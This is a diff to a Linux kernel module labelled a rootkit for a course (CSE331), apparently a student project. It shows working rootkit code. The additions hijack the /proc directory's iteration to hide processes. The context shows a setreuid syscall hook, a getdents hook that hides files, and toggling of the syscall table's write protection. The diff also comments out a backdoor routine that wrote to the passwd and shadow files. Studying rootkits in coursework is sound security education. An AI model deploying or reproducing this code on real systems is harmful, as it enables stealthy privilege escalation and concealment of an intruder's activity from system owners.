@@ -10,12 +10,26 @@
 #include <asm/unistd.h>
 #include <linux/dirent.h>
 
+
+
+
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/namei.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <asm/current.h>
+
+
+
+
+
 MODULE_LICENSE("GPL") ;
 MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
 MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
 MODULE_VERSION("0.3");
 
-void **sys_call_address; // Pointer to the sys_call_table
+void **sys_call_address; // Pointer to the sys_call_table	
 
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
 asmlinkage long our_setreuid(const struct pt_regs *regs){
@@ -41,7 +55,8 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 }
 
 // Start Marc
-	void add_backdoor(char *path) {
+/*	
+void add_backdoor(char *path) {
 		struct file *file;
 		char *BACKDOOR;
 		mm_segment_t old_fs;
@@ -143,7 +158,7 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 		}
 }
 // End Marc
-
+*/
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
 
 // taken from man getdents(2)
@@ -206,6 +221,46 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 
 // END BRIAN
 
+
+//START CARLOS	
+
+static char *proc_to_hide = "1";
+static struct file_operations proc_fops;
+static struct file_operations *backup_proc_fops;
+static struct inode *proc_inode;
+static struct path p;
+
+struct dir_context *backup_ctx;
+ 
+static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
+        loff_t off, u64 ino, unsigned int d_type)
+{
+    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
+        return 0;
+ 
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+ 
+struct dir_context rk_ctx = {
+    .actor = rk_filldir_t,
+};
+ 
+int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+    int result = 0;
+    rk_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
+    ctx->pos = rk_ctx.pos;
+ 
+    return result;
+}
+//START CARLOS  
+
+
+
+
+
 // Loads the LKM
 static int __init rootkit_init(void){
 	// Gets the address of the sys call table
@@ -217,8 +272,8 @@ static int __init rootkit_init(void){
 	
 	// Start Marc
 	
-	add_backdoor(PASSWD_FILE);
-    	add_backdoor(SHADOW_FILE);
+//	add_backdoor(PASSWD_FILE);
+//   	add_backdoor(SHADOW_FILE);
 	
 	// End Marc
 	
@@ -236,6 +291,24 @@ static int __init rootkit_init(void){
 	printk(KERN_INFO "setreuid replaced\n");
 	// End Brendan
 
+	//Start Carlos
+	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
+	
+	if(kern_path("/proc", 0, &p)){
+        	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
+		return 0;
+	}
+		
+	
+	proc_inode = p.dentry->d_inode;/*get the inode*/
+    	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
+   	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
+  	proc_fops.iterate_shared = rk_iterate_shared; /* modify copy without hijacked function */
+   	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
+	printk(KERN_INFO "@$@?: Process in hiding");
+	//End Carlos
+		
+
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
 	return 0;
 }
@@ -249,6 +322,10 @@ static void __exit rootkit_exit(void){
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
 	printk(KERN_INFO "Old setreuid inserted");
 	printk(KERN_INFO "Rootkit Unloaded\n");
+	if(kern_path("/proc", 0, &p))
+        	return;
+    	proc_inode = p.dentry->d_inode;
+    	proc_inode->i_fop = backup_proc_fops;
 	return;
 }
 
